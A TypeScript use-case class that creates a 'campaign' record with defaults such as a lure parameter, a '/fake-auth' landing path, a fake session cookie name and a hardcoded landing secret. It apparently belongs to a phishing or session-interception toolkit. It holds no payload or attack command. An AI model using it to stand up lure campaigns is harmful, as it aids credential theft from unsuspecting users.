import { CampaignRepository } from '@famir/domain'
import { CreateCampaignDto } from './create-campaign.js'

export class CreateCampaignUseCase {
  constructor(private readonly campaignRepository: CampaignRepository) {}

  async execute(dto: CreateCampaignDto): Promise<true> {
    await this.campaignRepository.create(
      dto.description ?? 'Default campaign',
      dto.landingSecret ?? 'b7cf3362accb4a14a0de92d59a74781c',
      dto.landingAuthPath ?? '/fake-auth',
      dto.landingAuthParam ?? 'data',
      dto.landingLureParam ?? 'data',
      dto.sessionCookieName ?? 'fake-sess',
      dto.sessionExpire ?? 300 * 1000,
      dto.newSessionExpire ?? 300 * 1000,
      dto.sessionLimit ?? 100_000,
      dto.sessionEmergeIdleTime ?? 300 * 1000,
      dto.sessionEmergeLimit ?? 100,
      dto.messageExpire ?? 3600 * 1000,
      dto.messageLimit ?? 100_000,
      dto.messageEmergeIdleTime ?? 300 * 1000,
      dto.messageEmergeLimit ?? 100,
      dto.messageLockExpire ?? 300 * 1000
    )

    return true
  }
}
